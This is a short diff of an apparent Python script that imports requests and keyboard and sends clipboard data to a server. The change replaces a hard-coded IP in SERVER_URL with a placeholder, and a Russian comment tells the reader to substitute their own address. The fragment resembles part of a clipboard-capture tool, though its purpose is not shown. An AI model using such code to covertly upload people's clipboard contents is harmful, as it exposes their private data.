@@ -3,7 +3,7 @@ import requests
 import keyboard
 
 # URL вашего сервера
-SERVER_URL = 'http://95.139.90.238/api/clipboard'  # Замените на ваш адрес
+SERVER_URL = 'http://example_url/api/clipboard'  # Замените на ваш адрес
 
 def send_data_to_server(data):
     try:
